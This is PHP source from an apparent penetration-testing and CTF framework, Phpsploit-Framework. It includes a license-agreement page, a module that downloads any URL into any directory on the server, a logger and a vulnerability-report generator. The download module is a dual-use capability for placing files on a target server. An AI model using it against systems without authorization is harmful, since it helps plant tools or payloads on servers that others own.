            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_9 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_10 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_11 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_12 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_13 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_14 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_15 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_16 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_17 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_18 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_19 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_20 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_21 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_22 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_23 . "\n";
            self::$_document_body .= "\n";
        } else {
            self::$_document_body = "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_1 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_2 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_3 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_4 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_5 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_6 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_7 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_8 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_9 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_10 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_11 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_12 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_13 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_14 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_15 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_16 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_17 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_18 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_19 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_20 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_21 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_22 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_EN_BODY_TEXT_LINE_23 . "\n";
            self::$_document_body .= "\n";
        }
        return self::$_document_body;
    }

    public static function get_document_confirm ()
    {
        $_lang = Class_Base_Request::form ( "lang" , "string" , "en" );
        if ( $_lang == "cn" ) {
            return self::DOCUMENT_CN_CONFIRM;
        } else {
            return self::DOCUMENT_EN_CONFIRM;
        }
    }

    public static function get_command_line_form_parameter_description ()
    {
        $_lang = Class_Base_Request::form ( "lang" , "string" , "en" );
        if ( $_lang == "cn" ) {
            return self::DOCUMENT_CN_COMMAND_LINE_FORM_PARAMETER_DESCRIPTION;
        } else {
            return self::DOCUMENT_EN_COMMAND_LINE_FORM_PARAMETER_DESCRIPTION;
        }
    }

    public static function index ( $params = array () )
    {
        $_lang = Class_Base_Request::form ( "lang" , "string" , "cn" );
        if ( ! is_cli () ) {
            return ( Class_View::form_page (
                array (
                    "title"   => "phpsploit-framework" ,
                    "content" => '<div style="height:16px;"></div><div style="line-height:32px;font-size:32px;text-align: center;">User Authorization and License Agreement (Disclaimer)</div><div style="height:32px;"></div>' ,
                ) ,
                array (
                    "action"    => "/init" ,
                    "hiddens"   => array (
                        array (
                            "id"    => "is_enable_license_agreement" ,
                            "name"  => "is_enable_license_agreement" ,
                            "value" => 1 ,
                        ) ,
                    ) ,
                    "inputs"    => array (
                        array (
                            "id"       => "document_title" ,
                            "title"    => " " ,
                            "describe" => "title" ,
                            "name"     => "document_title" ,
                            "value"    => self::get_document_title () ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "id"       => "document_body" ,
                            "title"    => " " ,
                            "describe" => "body" ,
                            "name"     => "document_body" ,
                            "value"    => self::get_document_body () ,
                            "disabled" => "disabled" ,
                            "style"    => 'height:3100px;' ,
                        ) ,
                    ) ,
                    "submit"    => array (
                        "value" => ( ( $_lang == "cn" ) ? " 同意 " : " I agree " ) ,
                    ) ,
                    "reset"     => array (
                        "value"  => ( ( $_lang == "cn" ) ? " 拒绝 " : " I refuse " ) ,
                        "events" => array (
                            "onclick" => ( ( $_lang == "cn" ) ? ( "alert('注意，如果您拒绝接受以上协议条款，则无法继续使用本软件所提供的全部功能！');" ) : ( "alert('Note that if you refuse to accept the above agreement terms, you will not be able to continue using all the features provided by this software!');" ) ) ,
                        ) ,
                    ) ,
                    "button"    => array (
                        "value"   => ( ( $_lang == "cn" ) ? " 切换用户协议的语言版本 " : " Switch the language version of the user agreement " ) ,
                        "display" => true ,
                        "events"  => array (
                            "onclick" => "document.location.href='" . Class_Base_Response::get_url ( "/" , array ( "lang" => ( ( $_lang == "cn" ) ? "en" : "cn" ) ) ) . "';" ,
                        ) ,
                    ) ,
                    "gets"      => array () ,
                ) ,
                array () )
            );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Wget extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start               = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_timeout             = Class_Base_Request ::form ( "timeout" , Class_Base_Request::TYPE_INTEGER , 60 );
        $_display_progress    = Class_Base_Request ::form ( "display_progress" , Class_Base_Request::TYPE_INTEGER , 1 );
        $_file_url            = Class_Base_Request ::form ( "file_url" , Class_Base_Request::TYPE_STRING , "" );
        $_save_directory_path = Class_Base_Request ::form ( "save_directory_path" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! is_cli () ) {
            $_cli_url            = Class_Base_Response ::get_cli_url ( "/wget" , array ( 'start' => 1 , 'timeout' => $_timeout , 'display_progress' => $_display_progress , 'file_url' => $_file_url , 'save_directory_path' => $_save_directory_path , ) );
            $_cli_encode_url     = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top           = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Resource Requests And File Downloads</div>';
            $_form_top           .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is used to download the specified online resources to the specified directory on the server. Warning: Downloading inappropriate files to the server may pose a security risk. Unsuitable files include executable files in binary format, script command files in text format, etc. You should be fully aware that downloading inappropriate documents to server space can lead to various terrifying risk consequences! This includes but is not limited to functional abnormalities in server space, operating system, application programs, software crashes, data corruption, loss or leakage, and other situations! Before downloading the file, you should be fully aware that your improper behavior may bring legal risks and consequences to yourself! This module function must be used with caution. It can only be used for legally authorized penetration testing and security audit activities. The written contract you sign with the authorized party should clearly indicate that the authorized party allows you to download files and other related operations, and specify the types of files that can be downloaded. You must strictly abide by the contract content signed between you and the authorized party, and conduct safe, reasonable, and moderate file download behavior according to the contract content.</div>';
            $_form_name          = "form_0";
            $_form               = array (
                "action"    => "/wget" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "id"      => "timeout" ,
                        "title"   => "Request Timeout : " ,
                        "name"    => "timeout" ,
                        "options" => array (
                            array ( "describe" => "60 seconds" , "title" => "60 seconds" , "value" => 60 , "selected" => ( ( $_timeout == 60 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "120 seconds" , "title" => "120 seconds" , "value" => 120 , "selected" => ( ( $_timeout == 120 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "180 seconds" , "title" => "180 seconds" , "value" => 180 , "selected" => ( ( $_timeout == 180 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "300 seconds" , "title" => "300 seconds" , "value" => 300 , "selected" => ( ( $_timeout == 300 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "600 seconds" , "title" => "600 seconds" , "value" => 600 , "selected" => ( ( $_timeout == 600 ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                    array (
                        "id"      => "display_progress" ,
                        "title"   => "Display progress : " ,
                        "name"    => "display_progress" ,
                        "options" => array (
                            array ( "describe" => "Yes" , "title" => "Yes" , "value" => 1 , "selected" => ( ( $_display_progress == 1 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "No" , "title" => "No" , "value" => 0 , "selected" => ( ( $_display_progress == 0 ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "file_url" ,
                        "title"    => "Request File Url : " ,
                        "describe" => "Request File Url" ,
                        "name"     => "file_url" ,
                        "value"    => $_file_url ,
                    ) ,
                    array (
                        "id"       => "save_directory_path" ,
                        "title"    => "File Save Directory : " ,
                        "describe" => "File Save Directory" ,
                        "name"     => "save_directory_path" ,
                        "value"    => $_save_directory_path ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Download To Server )" ,
                    "name"  => "submit_form" ,
                    "value" => "start download server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Download Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Wget Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top                = Class_View_Top ::top ();
            $_body               = array (
                "menu"    => Class_View_Wget_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu        = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_search_progress_id = "search_rogress_id";
            $_search_errors_id   = "search_errors_id";
            $_search_result_id   = "search_result_id";
            $_content            = '<div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Request Progress</div><div id="' . $_search_progress_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Request Errors</div><div id="' . $_search_errors_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;text-align: center;font-size:18px;">Request Result</div><div id="' . $_search_result_id . '" style="padding-top:16px;padding-bottom:16px;text-align: left;font-size:18px;"></div>';
            $_javascript         = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom             = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( ! empty( $_start ) ) && ( ! empty( $_timeout ) ) && ( is_integer ( $_timeout ) ) && ( in_array ( $_timeout , array ( 60 , 120 , 180 , 300 , 600 ) ) ) && ( ! empty( $_file_url ) ) && ( is_string ( $_file_url ) ) && ( is_string ( $_save_directory_path ) ) && ( strlen ( $_save_directory_path ) > 0 ) && ( file_exists ( $_save_directory_path ) ) && is_dir ( $_save_directory_path ) ) {
            Class_Base_Request ::init ( $_timeout );
            Class_Base_Request ::send ( $_file_url , array () , array () , true , $_save_directory_path , $_display_progress , $_search_progress_id , $_search_errors_id , $_search_result_id );
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-17
 * Time: 下午2:02
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Log extends Class_Base
{
    const TYPE_ERROR     = 123456789010000001;
    const TYPE_EXCEPTION = 123456789020000001;
    const TYPE_SECURITY  = 123456789030000001;
    const TYPE_USER      = 123456789040000001;
    private static $_types = array (
        123456789010000001 => 'ERROR' ,
        123456789020000001 => 'EXCEPTION' ,
        123456789030000001 => 'SECURITY' ,
        123456789040000001 => 'USER' ,
    );

    public static function exist_type ( $type )
    {
        if ( Class_Base_Format::is_minlen_to_maxlen_integer ( $type , 18 , 18 ) ) {
            if ( ! is_integer ( $type ) ) {
                $type = intval ( $type );
            }
            if ( isset( self::$_types[ $type ] ) ) {
                return true;
            }
        }
        return false;
    }

    public static function add_content ( $type , $content , $title )
    {
        if ( ! self::exist_type ( $type ) ) {
            throw new \Exception( ( "type is error , type : " . print_r ( $type , true ) ) , 0 );
        }
        $_time        = time ();
        $_time_format = date ( 'Y-m-d H:i:s' , $_time );
        $_user        = ( posix_getuid () . ':' . posix_getgid () );
        $_array       = array ( 'type' => ( $type . ':' . self::$_types[ $type ] ) , 'time' => $_time , 'Y-m-d_H:i:s' => $_time_format , 'user' => $_user , 'title' => $title , 'content' => $content );
        $_json        = json_encode ( $_array );
        $_line        = "\n" . $_json . "\n";
        $_line_length = strlen ( $_line );
        $_shmid       = Class_Base_Memory::open_share_memory ( $type , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 );
        if ( empty( $_shmid ) ) {
            throw new \Exception( "share memory id is error" , 0 );
        }
        $_occupancy_size = Class_Base_Memory::size_share_memory ( $_shmid );
        $_remain_size    = ( Class_Base_Memory::BLOCK_SIZE_1048576 - $_occupancy_size );
        if ( $_remain_size < $_line_length ) {
            throw new \Exception( ( "reamin_size is error , reamin_size : " . print_r ( $_remain_size , true ) ) , 0 );
        }
        $_write_length = Class_Base_Memory::write_share_memory ( $_shmid , $_line , $_occupancy_size , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_write_length ) ) {
            throw new \Exception( "share memory write length is error" , 0 );
        }
        $_remain_size = ( $_remain_size - $_line_length );
        return $_remain_size;
    }

    public static function get_content ( $type )
    {
        if ( ! self::exist_type ( $type ) ) {
            throw new \Exception( ( "type is error , type : " . print_r ( $type , true ) ) , 0 );
        }
        $_shmid = Class_Base_Memory::open_share_memory ( $type , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( empty( $_shmid ) ) {
            throw new \Exception( "share memory id is error" , 0 );
        }
        $_read_data   = Class_Base_Memory::read_share_memory ( $_shmid , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        $_show_string = Class_Base_Format::data_to_string ( $_read_data );
        return $_show_string;
    }

    public static function get_json_array ( $type )
    {
        $_content = trim ( self::get_content ( $type ) , "\n" );
        $_array   = explode ( "\n\n" , $_content );
        return $_array;
    }

    public static function get_array ( $type )
    {
        $_json_array = get_json_array ( $type );
        $_array      = array ();
        foreach ( $_json_array as $index => $json ) {
            $_array[ $index ] = json_decode ( $json , true );
        }
        return $_array;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-11
 * Time: 下午6:37
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Report extends Class_Base
{
    public static function output_mime_xls_header ( $file_name = null )
    {
        if ( is_null ( $file_name ) ) {
            $file_name = time ();
        }
        if ( ! is_string ( $file_name ) ) {
            $file_name = strval ( $file_name );
        }
        header ( 'Pragma:public' );
        header ( 'Expires:0' );
        header ( 'Cache-Control:must-revalidate,post-check=0,pre-check=0' );
        header ( 'Content-Type:application/force-download' );
        header ( 'Content-Type:application/octet-stream' );
        header ( 'Content-Type:application/download' );
        header ( 'Content-Disposition:attachment,filename=' . ( $file_name ) . '.xls' );
        header ( 'Content-Transfer-Encoding:binary' );
    }

    public static function output_xls_file_content ( $file_name = null , $map = array () )
    {
        self::output_mime_xls_header ( $file_name );
        echo ( self::get_xls_content ( $map ) );
    }

    public static function get_xls_content ( $map )
    {
        $_xls_bof     = self::get_xls_bof_flag_content ();
        $_xls_eof     = self::get_xls_eof_flag_content ();
        $_xls_content = $_xls_bof;
        $_field_names = null;
        if ( ( ! empty( $map ) ) && ( is_array ( $map ) ) ) {
            foreach ( $map as $map_index => $fields ) {
                if ( ( ! empty( $fields ) ) && ( is_array ( $fields ) ) ) {
                    if ( is_null ( $_field_names ) ) {
                        $_field_names = array_keys ( $fields );
                        foreach ( $_field_names as $name_index => $name ) {
                            $_xls_content .= self::get_xls_string_field_content ( 0 , $name_index , $name );
                        }
                    }
                    $_values = array_values ( $fields );
                    foreach ( $_values as $value_index => $field_value ) {
                        if ( is_bool ( $field_value ) || is_numeric ( $field_value ) || is_integer ( $field_value ) || is_float ( $field_value ) || is_double ( $field_value ) ) {
                            if ( is_bool ( $field_value ) ) {
                                $field_value = ( ( $field_value === false ) ? 0 : 1 );
                            }
                            $_xls_content .= self::get_xls_number_field_content ( ( $map_index + 1 ) , ( $value_index ) , $field_value );
                        } else {
                            if ( is_array ( $field_value ) ) {
                                $field_value = json_encode ( $field_value );
                            } else if ( is_object ( $field_value ) ) {
                                $field_value = json_encode ( $field_value );
                            } else {
                                $field_value = strval ( $field_value );
                            }
                            $_xls_content .= self::get_xls_string_field_content ( ( $map_index + 1 ) , ( $value_index ) , $field_value );
                        }
                    }
                }
            }
        }
        $_xls_content .= $_xls_eof;
        return $_xls_content;
    }

    public static function get_xls_bof_flag_content ()
    {
        $_xls_bof = pack ( "ssssss" , 0x809 , 0x8 , 0x0 , 0x10 , 0x0 , 0x0 );
        return $_xls_bof;
    }

    public static function get_xls_eof_flag_content ()
    {
        $_xls_bof = pack ( "ss" , 0x0a , 0x00 );
        return $_xls_bof;
    }

    public static function get_xls_number_field_content ( $rows_index , $cols_index , $value )
    {
        $_xls_number_field_content = ( pack ( "sssss" , 0x203 , 14 , $rows_index , $cols_index , 0x0 ) . pack ( "d" , $value ) );
        return $_xls_number_field_content;
    }

    public static function get_xls_string_field_content ( $rows_index , $cols_index , $value )
    {
        $_byte_size  = 8;
        $_value_size = strlen ( $value );

        $_xls_string_field_content = ( pack ( "ssssss" , 0x204 , ( $_byte_size + $_value_size ) , $rows_index , $cols_index , 0x0 , ( $_value_size ) ) . ( $value ) );
        return $_xls_string_field_content;
    }

    public static function output_vulnerability_report_content ( $array = array () )
    {
        self::output_mime_xls_header ();
        echo self::get_vulnerability_report_content ( $array );
    }

    public static function get_vulnerability_report_content ( $array = array () )
    {
        if ( ! is_array ( $array ) ) {
            $array = array ();
        }
        foreach ( $array as $index => $item ) {

        }
    }

    public static function get_word_content_header ()
    {
        $_word_content_header = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns= "http://www.w3.org/TR/REC-html40">';
        return $_word_content_header;
    }

    public static function get_word_content_body ( $content )
    {
        return $content;
    }

    public static function get_word_content_footer ()
    {
        $_word_content_footer = '"</html>';
        return $_word_content_footer;
    }

    public static function get_word_content ( $content )
    {
        $_word_content_header = self::get_word_content_header ();
        $_word_content_body   = self::get_word_content_body ( $content );
        $_word_content_footer = self::get_word_content_footer ();
        $_word_content        = ( $_word_content_header . $_word_content_body . $_word_content_footer );
        return $_word_content;
    }
}










/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Report extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Report_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function create_vulnerability_report ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_is_append                 = false;
        $_risk_level_limits         = array ( 1 , 2 , 3 , 4 , 5 , );
        $_discovery_method_limits   = array ( 1 , 2 , );
        $_vulnerability_type_limits = array ( 1 , 2 , 3 , 4 , 5 , );
        for ( $index = 0 ; $index < 10 ; $index ++ ) {
            $_risk_level                                               = Class_Base_Request ::form ( "risk_level_" . $index , Class_Base_Request::TYPE_INTEGER , 0 );
            $_discovery_method                                         = Class_Base_Request ::form ( "discovery_method_" . $index , Class_Base_Request::TYPE_INTEGER , 0 );
            $_vulnerability_type                                       = Class_Base_Request ::form ( "vulnerability_type_" . $index , Class_Base_Request::TYPE_INTEGER , 0 );
            $_vulnerability_name                                       = Class_Base_Request ::form ( "vulnerability_name_" . $index , Class_Base_Request::TYPE_STRING , "" );
            $_vulnerability_discovery_personnel                        = Class_Base_Request ::form ( "vulnerability_discovery_personnel_" . $index , Class_Base_Request::TYPE_STRING , "" );
            $_contact_information_of_vulnerability_discovery_personnel = Class_Base_Request ::form ( "contact_information_of_vulnerability_discovery_personnel_" . $index , Class_Base_Request::TYPE_STRING , "" );
            $_vulnerability_impact                                     = Class_Base_Request ::form ( "vulnerability_impact_" . $index , Class_Base_Request::TYPE_STRING , "" );
            $_vulnerability_discovery_process                          = Class_Base_Request ::form ( "vulnerability_discovery_process_" . $index , Class_Base_Request::TYPE_STRING , "" );
            $_solution_proposal                                        = Class_Base_Request ::form ( "solution_proposal_" . $index , Class_Base_Request::TYPE_STRING , "" );
            if ( ! isset( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
                $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
            }
            if ( ! is_array ( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
                $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
            }
            if ( ( in_array ( $_risk_level , $_risk_level_limits ) ) && ( in_array ( $_discovery_method , $_discovery_method_limits ) ) && ( in_array ( $_vulnerability_type , $_vulnerability_type_limits ) ) ) {
                $_vulnerability_name_length                                       = strlen ( $_vulnerability_name );
                $_vulnerability_discovery_personnel_length                        = strlen ( $_vulnerability_discovery_personnel );
                $_contact_information_of_vulnerability_discovery_personnel_length = strlen ( $_contact_information_of_vulnerability_discovery_personnel );
                if ( ( ( $_vulnerability_name_length > 0 ) && ( $_vulnerability_name_length <= 100 ) ) && ( ( $_vulnerability_discovery_personnel_length > 0 ) && ( $_vulnerability_discovery_personnel_length <= 100 ) ) && ( ( $_contact_information_of_vulnerability_discovery_personnel_length > 0 ) && ( $_contact_information_of_vulnerability_discovery_personnel_length <= 100 ) ) ) {
                    $_vulnerability_impact_length            = strlen ( $_vulnerability_impact );
                    $_vulnerability_discovery_process_length = strlen ( $_vulnerability_discovery_process );
                    $_solution_proposal_length               = strlen ( $_solution_proposal );
                    if ( ( ( $_vulnerability_impact_length > 0 ) && ( $_vulnerability_impact_length <= 10000 ) ) && ( ( $_vulnerability_discovery_process_length > 0 ) && ( $_vulnerability_discovery_process_length <= 10000 ) ) && ( ( $_solution_proposal_length > 0 ) && ( $_solution_proposal_length <= 10000 ) ) ) {
                        $_SESSION[ "VULNERABILITY_REPORT" ][] = array (
                            "risk_level"                                               => $_risk_level ,
                            "discovery_method"                                         => $_discovery_method ,
                            "vulnerability_type"                                       => $_vulnerability_type ,
                            "vulnerability_name"                                       => $_vulnerability_name ,
                            "vulnerability_discovery_personnel"                        => $_vulnerability_discovery_personnel ,
                            "contact_information_of_vulnerability_discovery_personnel" => $_contact_information_of_vulnerability_discovery_personnel ,
                            "vulnerability_impact"                                     => $_vulnerability_impact ,
                            "vulnerability_discovery_process"                          => $_vulnerability_discovery_process ,
                            "solution_proposal"                                        => $_solution_proposal ,
                        );
                        $_is_append                           = true;
                    }
                }
            }
        }
        if ( ( $_is_append ) && ( ! empty( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) ) {
            Class_Base_Response ::redirect ( "/report/show_vulnerability_report" , array () );
            return null;
        }

        $_result                 = "";
        $_connect_domain_List_id = "result_data";
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Create Vulnerability Report</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to create vulnerability reports, which include vulnerability names, vulnerability types, vulnerability risk levels, vulnerability discovery methods, vulnerability discovery processes, vulnerability impact levels, solution suggestions for vulnerabilities, vulnerability discoverers, and their contact information. By using this module function, you can easily create vulnerability reports online.</div>';
            $_form_id     = ( 'report_vulnerability_report_form_id' );
            $_form        = array (
                "action"    => "/report/create_vulnerability_report" ,
                "id"        => $_form_id ,
                "name"      => "report_vulnerability_report_form" ,
                "hiddens"   => array () ,
                "selects"   => array () ,
                "inputs"    => array () ,
